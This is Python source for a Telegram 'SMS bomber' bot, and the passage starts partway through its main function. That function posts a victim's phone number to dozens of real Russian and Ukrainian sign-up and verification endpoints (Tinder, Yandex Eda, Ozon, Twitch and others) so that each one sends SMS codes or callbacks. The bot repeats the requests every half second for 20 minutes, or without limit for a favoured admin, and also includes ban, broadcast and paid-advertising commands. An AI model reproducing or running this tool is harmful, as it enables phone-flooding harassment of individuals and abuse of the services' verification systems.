	    print('-')
	try:
		requests.post(
			"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
			data={"phone_number": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://youla.ru/web-api/auth/request_code",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://rutube.ru/api/accounts/sendpass/phone",
			data={"phone": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
			params={"pageName": "registerPrivateUserPhoneVerificatio"},
			data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
			data={"phone_number": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://passport.twitch.tv/register?trusted_request=true",
			json={
				"birthday": {"day": 11, "month": 11, "year": 1999},
				"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
				"include_verification_code": True,
				"password": password,
				"phone_number": phone,
				"username": username,
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://lk.belkacar.ru/register",
			data={"phone": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api.ivi.ru/mobileapi/user/register/phone/v6",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://www.sportmaster.ua/",
			params={"module": "users", "action": "SendSMSReg", "phone": phone},
			headers=head,
			timeout=2,
		)
		requests.post(
			"https://lk.belkacar.ru/get-confirmation-code",
			data={"phone": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://secure.online.ua/ajax/check_phone/",
			params={"reg_phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://www.nl.ua",
			data={
				"component": "bxmaker.authuserphone.login",
				"sessid": "bf70db951f54b837748f69b75a61deb4",
				"method": "sendCode",
				"phone": phone,
				"registration": "N",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://mobileplanet.ua/register",
			data={
				"klient_name": _name,
				"klient_phone": "+" + phone,
				"klient_email": _email,
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api.delitime.ru/api/v2/signup",
			data={"SignupForm[username]": phone, "SignupForm[device_type]": 3},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://apteka366.ru/login/register/sms/send",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://belkacar.ru/get-confirmation-code",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://drugvokrug.ru/siteActions/processSms.html",
			data={"cell": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api.ennergiia.com/auth/api/development/lor",
			json={"referrer": "ennergiia", "phone": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.get(
			"https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}".format(
				"+" + phone
			),
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://gorzdrav.org/login/register/sms/send",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
			data={"phone": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api-production.viasat.ru/api/v1/auth_codes",
			json={"msisdn": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://eda.yandex/api/v1/user/request_authentication_code",
			json={"phone_number": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://eda.yandex/api/v1/user/request_authentication_code",
			json={"phone_number": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://my.dianet.com.ua/send_sms/",
			headers=head,
			data={"phone": phone},
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.get(
			"https://api.eldorado.ua/v1/sign/",
			params={
				"login": phone,
				"step": "phone-check",
				"fb_id": "null",
				"fb_token": "null",
				"lang": "ru",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://shafa.ua/api/v3/graphiql",
			json={
				"operationName": "RegistrationSendSms",
				"variables": {"phoneNumber": "+" + phone},
				"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  field\n	  messages {\n		message\n		code\n		__typename\n	  }\n	  __typename\n	}\n	__typename\n  }\n}\n",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	def mask(str, maska):
				if len(str) == maska.count('#'):
					str_list = list(str)
					for i in str_list:
						maska=maska.replace("#", i, 1)
					return maska
	try:
		phonee = mask(str=phone, maska="+# (###) ###-##-##")
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone[1:], maska="8(###)###-##-##")
		requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-##-##")
		requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=10)
		requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}, proxies=proxies, timeout=10) 
		print('+')
	except:
	    print('-')
	try:
		# под сомнением 
		phonee = mask(str=phone, maska="#(###)###-##-##")
		requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee}, proxies=proxies, timeout=10)

		phonee = mask(str=phone, maska="+#(###)###-##-##")
		requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-##-##")
		requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="8(###)###-##-##")
		requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(phone, maska="+# (###) ### - ## - ##")
		requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="(+#)##########")
		requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone9, maska="8(###)###-##-##")
		requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone9, maska="8 (###) ###-##-##")
		requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone9, maska="8-###-###-##-##")
		requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-##-##")
		requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  field\n	  messages {\n		message\n		code\n		__typename\n	  }\n	  __typename\n	}\n	__typename\n  }\n}\n"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  ...errorsData\n	  __typename\n	}\n	__typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n	code\n	message\n	__typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+#(###)###-##-##")
		requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonee, "alien": "0"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+#-###-###-##-##")
		requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonee}}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-##-##")
		requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-##-##")
		requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone9, maska="8-###-###-##-##")
		requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-####")
		requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+#-###-###-##-##")
		requests.post("https://paylate.ru/registry",data={"mobile": phonee,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone, maska="+# (###) ###-####")
		requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonee}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.ollis.ru/gql",json={"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		phonee = mask(str=phone9, maska="8 (###) ###-##-##")
		requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonee,"call_time": "1","pravila2": "on"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://auth.multiplex.ua/login", json={"login": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone}, proxies=proxies, timeout=10)
		print('+')
	except:
	    print('-')

def start_spam(chat_id, phone_number, force):
	running_spams_per_chat_id.append(chat_id)
	print(phone_number)
	end = datetime.now() + timedelta(minutes=20)
	while (datetime.now() < end) or (force and chat_id == 906123359):
		if chat_id not in running_spams_per_chat_id:
			break
		time.sleep(0.5)
		print('SPAM')
		send_for_number(phone_number)
	THREADS_AMOUNT[0] -= 1  # стояло 1
	try:
		running_spams_per_chat_id.remove(chat_id)
	except Exception:
		pass

async def spam_handler(phone, chat_id, force):
	global phones
	if int(chat_id) in running_spams_per_chat_id:
		await bot.send_message(chat_id,
						 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова')
		return
	await bot.send_message(chat_id, str(phone) + ", \n".join(running_spams_per_chat_id))
	# Если количество тредов меньше максимального создается новый который занимается спамом
	#if THREADS_AMOUNT[0] < THREADS_LIMIT:
	#	await start_spam(chat_id, phone, force)
	#	THREADS_AMOUNT[0] += 1
	#	phones.append(phone)
	if THREADS_AMOUNT[0] < THREADS_LIMIT:
		if force:
			msg = f'Спам запущен на неограниченое время для номера +{phone}'
		else:
			msg = f'Спам запущен на 20 минут на номер +{phone}'

		await bot.send_message(chat_id, msg)
		x = threading.Thread(target=start_spam,
							 args=(chat_id, phone, force))
		threads.append(x)
		THREADS_AMOUNT[0] += 1
		x.start()
	else:
		await bot.send_message(chat_id, 'Сервера перегружены. Попробуйте снова через минуту')
		print('Максимальное количество тредов. отменено.')

@dp.message_handler(commands=['admin'])
async def admin(message: types.Message):
	global users, banned, admins
	for admin in admins:
			if str(admin) == str(message.chat.id):
				await bot.send_message(message.chat.id, 'Список забаненых: ' + str(banned) +
								'\nСписок админов: ' + str(admins) +
								'\n/ban <id> -- забанить\n/unban <id> -- отбанить\n/add <id> -- добавить админа\n/del <id> -- удалить амина(может только главный)')
	print(banned)
	if str(message.from_user.id) == '1218845111':
		await bot.send_message(message.chat.id, 'users: ' + str(users))
		f = open("database.db","rb")
		await bot.send_document(message.chat.id, f)

@dp.message_handler(commands=['add'])
async def addadmin(message: types.Message):
	global users, banned, admins
	if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
		if message.text != '/add':
			thisid = message.text.replace('/add ', '')
			admins.append(thisid)
			await bot.send_message(message.chat.id, 'You add admin: ' + str(thisid))
			print(admins)
		else:
			await bot.send_message(message.chat.id, 'Надо /add <id>, а не просто /add !!!')

@dp.message_handler(commands=['del'])
async def addadmin(message: types.Message):
	global users, banned, admins
	if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
		if message.text != '/del':
			thisid = message.text.replace('/del ', '')
			admins.remove(thisid)
			await bot.send_message(message.chat.id, 'You delete admin: ' + str(thisid))
			print(admins)
		else:
			await bot.send_message(message.chat.id, 'Надо /del <id>, а не просто /del !!!')

@dp.message_handler(commands=['ban'])
async def ban(message: types.Message):
	global users, banned, admins
	for admin in admins:
			if str(admin) == str(message.chat.id):
				if message.text != '/ban':
					thisid = message.text.replace('/ban ', '')
					if thisid == '906123359':
						await bot.send_message(message.chat.id, 'Кодер это предусмотрел, ты не самый умный)))')
					else:
						try:
							banned.append(thisid)
							await bot.send_message(message.chat.id, 'You ban user: ' + str(thisid))
						except Exception:
							await bot.send_message(message.chat.id, 'OOF')
					print(banned)
				else:
					await bot.send_message(message.chat.id, 'Надо /ban <id>, а не просто /ban !!!')
	if str(message.from_user.id) == '1218845111':
		await bot.send_message(message.chat.id, 'banned: ' + str(banned))

@dp.message_handler(commands=['unban'])
async def unban(message: types.Message):
	global users, banned
	for admin in admins:
			if str(admin) == str(message.chat.id):
				thisid = message.text.replace('/unban ', '')
				try:
					banned.remove(thisid)
					await bot.send_message(message.chat.id, 'You unban user: ' + str(thisid))
				except Exception:
					await bot.send_message(message.chat.id, 'Он не был забанен!')
				print(banned)
	if str(message.from_user.id) == '1218845111':
		await bot.send_message(message.chat.id, 'banned: ' + str(banned))

@dp.message_handler(commands=['send'])
async def sender(message: types.Message):
	for admin in admins:
		if str(admin) == str(message.chat.id):
			text = message.text.replace('/send ', '')
			session = db_session.create_session()
			user_all = session.query(User).all()
			have = 0
			await bot.send_message(message.chat.id, 'Рассылка запущена!')
			try:
				for all in user_all:
					await bot.send_message(all.id, text)
					have = have + 1
			except Exception:
				pass
			await bot.send_message(message.chat.id, 'Всем отправлено! Получило ' + str(have) + ' человек.')

@dp.message_handler(content_types=['text'])
async def handle_message_received(message):
	global users
	if check(message.chat.id) == True:
		chat_id = int(message.chat.id)
		text = message.text
		B = False
		for admin in admins:
			if str(admin) == str(message.chat.id):
				B = True

		if text == 'ℹ️Инфа':
			await bot.send_message(chat_id,
							 'Создатель: @vsecoder для @Valerij212121\nПо вопросам сотрудничества обращаться в лс к создателю')

		elif text == '💣БОМБЕР':
			await bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx')

		elif text == '📈Статистика':
			await bot.send_message(chat_id,
							 f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users}\nСервисов для RU🇷🇺: ?\nСервисов для UK🇺🇦: 51\nБот запущен: 19.01.2020')

		elif text == '💰Донат боту на дедик':
			await bot.send_message(chat_id,
							 'Бандиты, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI +380993013264')

		elif text == '💸 Реклама':
			await bot.send_message(chat_id,
							 'В Нашем Боте 2 рассылки стоит 100 рублей\nЕе получат все пользователи бота\nПо вопросам покупки писать @Valerij212121')
		elif text == 'Рассылка' and B == True:
			await bot.send_message(chat_id, '/send <текст рассылки>')

		elif text == 'FAQ':
			await bot.send_message(chat_id, '"Pro Hacker ✔" не за что не отвечает!😂')

		elif text == 'Стоп':
			if chat_id not in running_spams_per_chat_id:
				await bot.send_message(chat_id, 'Ты еще не начинал спам')
			else:
				running_spams_per_chat_id.remove(chat_id)
				await bot.send_message(chat_id, 'Спам остановлен')

		elif len(text) == 11:
			phone = text
			await spam_handler(phone, chat_id, force=False)

		elif len(text) == 12:
			phone = text
			await spam_handler(phone, chat_id, force=False)
			if len(text) == 12 and B == True and text[0] == '_':
				phone = text[1:]
				await spam_handler(phone, chat_id, force=True)

		else:
			await bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
			print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
	else:
		await bot.send_message(message.chat.id, 'Вы были забанены, все вопросы к @Valerij212121')

#
if __name__ == "__main__":
	executor.start_polling(dp)
